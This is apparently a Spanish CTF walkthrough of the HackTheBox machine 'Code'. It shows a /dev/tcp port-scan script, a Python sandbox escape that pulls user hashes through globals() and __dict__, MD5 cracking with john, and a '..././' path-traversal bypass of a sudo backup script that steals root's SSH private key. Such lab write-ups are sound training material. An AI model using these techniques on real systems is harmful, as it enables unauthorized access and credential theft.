---
layout      : post
title       : "HackTheBox - Code"
author      : lanz
footer_image: assets/images/footer-card/linux-icon.png
footer_text : Linux
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/code/htb653-banner.png
category    : [ htb ]
tags        : [ sudo, backy, Python, path-traversal, code-analysis, cracking ]
---
Entorno Linux nivel f√°cil. Puertos escondidos, lenguaje de programaci√≥n **Python** pa jugar y encontrar cositas, y backups pa guardar archivos que no deber√≠amos poder guardar :P

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/code/htb653-lab-information.png" style="width: 100%;"/>

## TL;DR (Spanish writeup)

**üí• Laboratorio creado por**: [FisMatHack](https://app.hackthebox.com/profile/1076236).

Globalidad.

Logramos encontrar un sitio web escaneando los puertos manualmente y no con `nmap`, al verlo nos enfrentaremos a un editor de c√≥digo `Python`, jugando con el lenguaje obtendremos informaci√≥n de clases y con ellas credenciales, las reutilizaremos contra el servicio `SSH` para obtener una sesi√≥n como el usuario `martin`.

**Martin** tiene privilegios para ejecutar como cualquier usuario un script de `bash` que se encarga de realizar backups con la herramienta `backy`, haciendo an√°lisis de c√≥digo, bypassearemos algunos filtros que tiene el programa y aprovecharemos un **salto de directorios** para leer archivos arbitrarios del sistema.

Usando este ataque leeremos la llave **SSH** privada del usuario `root` y generaremos una sesi√≥n como √©l.

...

### Clasificaci√≥n de la m√°quina seg√∫n la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/code/htb653-statistics.png" style="width: 80%;"/>

Temas reales y alguno que otro movimiento curioso.

> La idea inicial de esta locura es tener mis "notas" por si algun d√≠a se me olvida todo (lo que es muuuy probable), leer esto y reencontrarme (o talvez no) üòÑ La segunda idea surgio con el tiempo, ya que me di cuenta que esta es una puerta para personitas que como yo al inicio (o simplemente a veces) nos estancamos en este mundo de la seguridad, por lo que si tengo la oportunidad de ayudarlos ¬øpor qu√© no hacerlo?

> Un detalle es que si ves mucho texto, es por que me gusta mostrar tanto errores como exitos y tambien plasmar todo desde una perspectiva m√°s de ense√±anza que de solo pasos a seguir. Sin menos, muchas gracias <3

...

Blue!

1. [Reconocimiento](#reconocimiento)
2. [Enumeraci√≥n](#enumeracion)
  * [Python Code Editor](#enumeracion-puerto-5000)
  * [Globalidades](#enumeracion-py-globals)
  * [A clase!](#enumeracion-py-clases)
3. [Explotaci√≥n](#explotacion)
4. [Escalada de privilegios](#escalada-de-privilegios)
5. [Post-Explotaci√≥n](#post-explotacion)

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

Empezamos revisando que servicios (puertos) tiene expuestos este entorno, para ello podemos emplear `nmap`:

```bash
nmap -p- --open -v 10.10.11.62 -oA tcp-all-htb_code
```

| Par√°metro | Descripci√≥n |
| --------- | :---------- |
| -p-       | Escanea todos los 65535 puertos |
| --open    | Devuelve solo los puertos que est√©n abiertos |
| -v        | Permite ver en consola lo que va encontrando |
| -oA       | Guarda el output en diferentes formatos, entre ellos uno "grepeable". Lo usaremos junto a la funci√≥n [extractPorts](https://pastebin.com/raw/X6b56TQ8) de [S4vitar](https://s4vitar.github.io/) para copiar los puertos en la clipboard r√°pidamente |

El escaneo nos muestra:

| Puerto | Descripci√≥n |
| ------ | :---------- |
| 22     | **[SSH](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)**: Servicio que permite la obtenci√≥n de una terminal de forma segura |

¬øSolo un puerto? ¬øY el **SSH**? Medio raro, pueda que haya alg√∫n filtro contra `nmap`, as√≠ que hagamos el reconocimiento de puertos con un script:

```bash
#!/bin/bash

IP="10.10.11.62"

for port in $(seq 1 65535); do
    (timeout 1 bash -c "</dev/tcp/$IP/$port") >/dev/null 2>&1 && echo "Puerto Abierto: $IP:$port" &
done; wait
```

Y obtenemos:

```bash
‚ûß ./ports.sh 
Puerto Abierto: 10.10.11.62:22
Puerto Abierto: 10.10.11.62:5000
```

Ay, si hab√≠a un puerto escondido!! Por lo general ese puerto 5000 es un servicio web, ahora si empecemos a validar cositas.

# Enumeraci√≥n [#](#enumeracion) {#enumeracion}

Revisando el posible sitio web:

## Python Code Editor [üìå](#enumeracion-puerto-5000) {#enumeracion-puerto-5000}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/code/htb653-page5000.png" style="width: 100%;"/>

Encontramos un editor de c√≥digo **Python**, o sea, tenemos la opci√≥n de escribir texto en el lenguaje de programaci√≥n **Python**. Tambi√©n tenemos la posibilidad de **iniciar sesi√≥n** y de **registrarnos**.

Viendo el c√≥digo fuente del sitio, sabemos que mediante [Ace](https://ace.c9.io/) es que se logra la creaci√≥n del editor de c√≥digo.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/code/htb653-page5000source-ace.png" style="width: 100%;"/>

Como lo que tenemos es un sitio para interactuar con c√≥digo **Python**, pues pong√°monos a jugar con cositas...

Por ejemplo, despu√©s de algunas pruebas, encontramos la ruta actual donde se est√° ejecutando el sitio web. Esto mediante el uso de `sys.path`, el cual nos permite listar las rutas del sistema que usa **Python** para encontrar alg√∫n m√≥dulo que vayamos a usar:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/code/htb653-page5000-codeEditor-sysPath.png" style="width: 100%;"/>

```bash
['/home/app-production/app', '/usr/bin', '/usr/lib/python38.zip', '/usr/lib/python3.8', '/usr/lib/python3.8/lib-dynload', '/usr/local/lib/python3.8/dist-packages', '/usr/lib/python3/dist-packages']
```

Por ahora es info, as√≠ que la vamos guardando.

...

Sabemos que podemos ejecutar c√≥digo **Python**, ¬øpero podr√≠amos aprovecharlo para ejecutar cosas mal intencionadas? De ser as√≠ va a estar dif√≠cil, ya que al intentar usar `import`, `os`, `exec`, `system`, `subprocess` y otras cadenas de texto (muy usadas para ese tipo de intenciones), el servidor no procesa la petici√≥n.

Por lo cual nos ponemos en la tarea de probar algunos bypasses para ese tipo de entornos donde todo es muy restrictivo (sandbox):

* [Bypass Python sandboxes](https://github.com/b4rdia/HackTricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/README.md)

## Globalidades [üìå](#enumeracion-py-globals) {#enumeracion-py-globals}

Jugando con algunas, llegamos al apartado de los `globals and locals`:

* [Bypass Python sandboxes - globals()](https://github.com/b4rdia/HackTricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/README.md#globals-and-locals)

> La funci√≥n `globals()` devuelve una lista que contiene toooda la traza **global** de variables, funciones, clases y m√≥dulos importados que est√°n siendo usados por nuestro script.

Veamos cu√°les est√° usando el script:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/code/htb653-page5000-codeEditor-globals.png" style="width: 100%;"/>

Por defecto el script llama a muchas caracter√≠sticas que vienen incorporadas en el sistema, si queremos evitarlas y solo mostrar las creadas dentro del script, podr√≠amos ejecutar:

```python
for name,value in globals().items():
    if not name.startswith('__'):
        print(f"{name} : {value}")
        print("---------")
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/code/htb653-page5000-codeEditor-globalsWithoutBuiltin.png" style="width: 100%;"/>

Hay algunas cositas interesantes, pero lo que llama la atenci√≥n son esas dos clases `User` y `Code`.

> Una clase basicamente es un compendio de informaci√≥n (caracteristicas) perteneciente a un objeto, por lo que podriamos pensar que si hay una clase `User`, una de sus caracteristicas podria ser `username`, `email` o `password`...

## A clase! [üìå](#enumeracion-py-clases) {#enumeracion-py-clases}

Investigando sobre como extraer de las clases informaci√≥n sin conocerla, llegu√© a [este art√≠culo chino,](https://mp.weixin.qq.com/s/PLI-yjqmA3gwk5w3KHzOyA) :P el cual nos muestra el uso de [__dict__](https://realpython.com/python-dict-attribute/).

> "Basically it contains all the attributes which describe the object in question" ~ [stackoverflow.com](https://stackoverflow.com/questions/19907442/explain-dict-attribute)

Justo lo que necesitamos:

```python
print(User.__dict__)
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/code/htb653-page5000-codeEditor-UserDict.png" style="width: 100%;"/>

Upale, hay dos columnas en la clase `User` que est√° siendo manejada por `SQLAlchemy`: `username` y `password`!! Ojito...

Encontramos [este recurso](https://stackoverflow.com/questions/50509990/typeerror-sqlalchemy-properties-class-sqlalchemy-orm-attributes-instrumente) para entender como extraer los valores de esas columnas:

```python
person = Person.query.get(1)
print(person.age)
```

Por lo cual con nuestro ejercicio ser√≠a:

```python
user = User.query.get(1)
print(user.username)
// print(User.query.get(1).username) # o esta versi√≥n m√°s corta
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/code/htb653-page5000-codeEditor-UserQueryUsername.png" style="width: 100%;"/>

JA! Tenemooooos infoooooo :P :P

# Explotaci√≥n [#](#explotacion) {#explotacion}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/code/htb653-page5000-codeEditor-UserQueryUsernames.png" style="width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/code/htb653-page5000-codeEditor-UserQueryPasswords.png" style="width: 100%;"/>

Interesante, obtenemos las credenciales de dos usuarios, sus contrase√±as est√°n hasheadas con el algoritmo [MD5](https://www.okta.com/identity-101/md5/) (lo sabemos al usar [haiti](https://github.com/noraj/haiti) o alg√∫n otro identificador de hashes), el cual de por s√≠ no es recomendado para contrase√±as, ya que es muy vulnerable... Yyyyy vamos a ver si lo podemos vulnerar (:

Nos copiamos los hashes a un archivo y en mi caso usar√© [john the ripper](https://www.openwall.com/john/), un famoso crackeador de contrase√±as, el cual va a ir extrayendo una l√≠nea de texto de un archivo (en este caso) e ir√° generando hashes **MD5**, cuando uno de ellos sea igual al que le hemos pasado, sabremos que tenemos la contrase√±a en texto plano:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/code/htb653-bash-cat-UserClassHashes.png" style="width: 100%;"/>

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 User-class.hashes
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/code/htb653-bash-john-UserClassHashes.png" style="width: 100%;"/>

EEEEEEje, tenemos credenciales en texto planooooooo!! ¬øPero d√≥nde las probamos? Bueno, recuerda que el entorno est√° sirviendo el puerto `SSH`, as√≠ queee:

```bash
ssh martin@10.10.11.62
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/code/htb653-bash-ssh-martin.png" style="width: 100%;"/>

Estamos dentro (:

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Mirando si tenemos permisos sobre otros usuarios en el sistema, encontramos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/code/htb653-bash-ssh-martin-sudoL.png" style="width: 100%;"/>

Y si, como cualquier usuario y sin usar contrase√±a, podemos llamar al script `/usr/bin/backy.sh`, este es su contenido:

```bash
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```

Es un script que hace un backup con la herramienta [backy](https://github.com/vdbsh/backy) y tiene algunas validaciones internas, vamos a ir revis√°ndolas:

Las primeras l√≠neas sooooooon, validaciones, despu√©s empiezan a aparecer cosas juguetonas:

```bash
updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"
```

Toma del archivo `.json` que le estamos pasando la **llave** `directories_to_archive` y si encuentra la cadena de texto `../` en alguno de sus **valores**, la reemplaza por vac√≠o. As√≠ que si enviamos:

```json
{
    directories_to_archive: ["/var/buenas","/home/buenas/../../hola"]
}
```

El archivo final quedar√≠a as√≠:

```json
{
    directories_to_archive: ["/var/buenas","/home/buenas/hola"]
}
```

Lo que est√° haciendo es un filtro para evitar que alguien intente hacer backup a otros archivos movi√©ndose entre carpetas usando `../`, o sea, un [directory traversal](https://lanzt.github.io/article/directory-traversal). ¬ø¬ø¬øPero est√° bien implementado??? Ya veremos üßü‚Äç‚ôÄÔ∏è, terminemos de revisar el script.

Viene una √∫ltima validaci√≥n en la que se compara si los directorios que hemos indicado en la **llave** `directories_to_archive` empiezan con los directorios que el script fija como permitidos, que son `/var` y `/home`, simplemente cancela la ejecuci√≥n si esa regla no se cumple:

```bash
[...]
allowed_paths=("/var/" "/home/")
[...]

# ejemplo v√°lido: ["/var/buenas", "/home/buenas/hola"]
# ejemplo INvalido: ["/var/buenas", "/root/buenas/hola"]
directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done
```

Y finalmente ejecuta el backup con la herramienta [backy](https://github.com/vdbsh/backy):

```bash
[...]
/usr/bin/backy "$json_file"
```

Perfecto, ya sabemos que hace cada parte del programa, solo nos qued√≥ sonando lo del salto entre directorios...

Vemos que hace la validaci√≥n, peeeero, que pasa si como atacantes le pasamos este directorio:

```bash
updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")
```

```json
{
    directories_to_archive: ["/home/buenas/..././hola"]
}
```

El filtro actuaria removiendo la cadena `../` y ¬øc√≥mo quedar√≠a nuestro archivo?

```json
{
    directories_to_archive: ["/home/buenas/../hola"]
}
```

EJELEEEE SI SI SIIII, ya que el filtro se est√° ejecutando UNA sola vez!!!!!!!

Con esto, ya podemos intentar llegar a otros directorios, simplemente saliendo de los que estamos para entrar en otros :P

## Saltamontes [üìå](#escalada-backy-traversal) {#escalada-backy-traversal}

En internet hay un ejemplo de configuraci√≥n de un backup (el archivo `.json` que debemos pasarle al script):

* [https://github.com/vdbsh/backy?tab=readme-ov-file#task-configuration-format](https://github.com/vdbsh/backy?tab=readme-ov-file#task-configuration-format)

Seg√∫n eso y con la info que acabamos de encontrar (la pobre validaci√≥n de los directorios), podemos intentar leer el contenido de la ruta `/root/.ssh`, ese directorio muchas veces contiene llaves privadas de usuarios (en este caso `root`), las cuales podemos usar para iniciar sesi√≥n por SSH sin necesitar una contrase√±a.

Armamos una config tal que:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/code/htb653-bash-ssh-martin-backyConfig.png" style="width: 100%;"/>

Lanzamos:

```bash
sudo backy.sh hola.json
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/code/htb653-bash-ssh-martin-sudoBacky-pathTraversal.png" style="width: 100%;"/>

Se nos genera un archivo comprimido, que ha de ser el backup:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/code/htb653-bash-ssh-martin-lsLa-buenas.png" style="width: 100%;"/>

Tomamos el contenido del objeto y lo pasamos a `base64`, esto para copiarnos el output y pegarlo en nuestro sistema, es m√°s f√°cil y pr√°ctico jugar desde ah√≠:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/code/htb653-bash-ssh-martin-base64-buenas.png" style="width: 100%;"/>

```bash
‚ûß echo ...RAciZVLvt4A= | base64 -d > root-ssh.tar.bz2
```

Descomprimimos y revisamoooooos:

```bash
‚ûß tar -xvjf root-ssh.tar.bz2 
root/.ssh/
root/.ssh/id_rsa
root/.ssh/authorized_keys
‚ûß cd root/.ssh
‚ûß cat id_rsa
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/code/htb653-bash-cat-root-ssh-idRsa.png" style="width: 100%;"/>

¬°UPALE! La obtuvimos (: Y como te dije, esta llave nos sirve como una "contrase√±a", as√≠ que solamente debemos indicarle a `ssh` que vamos a usarla para autenticarnos:

```bash
ssh root@10.10.11.62 -i id_rsa
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/code/htb653-bash-ssh-root.png" style="width: 100%;"/>

Y listoneees, hemos rooteado este entorno!

# Post-Explotaci√≥n [#](#post-explotacion) {#post-explotacion}

---

## Flags [üìå](#post-explotacion-flags) {#post-explotacion-flags}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/code/htb653-flags.png" style="width: 100%;"/>

...

Linda m√°quina, el que todo haya sido enfocado en pensar y revisar c√≥digo estuvo ch√©vere, un poco agotador :P pero ch√©vere.

Bueno, espero te haya podido guiar o al menos dar herramientas para que uses, muchas gracias por pasarte y nos leeremos pronto!!!

A seguir d√°ndole y a romper de tooooodooOOO :O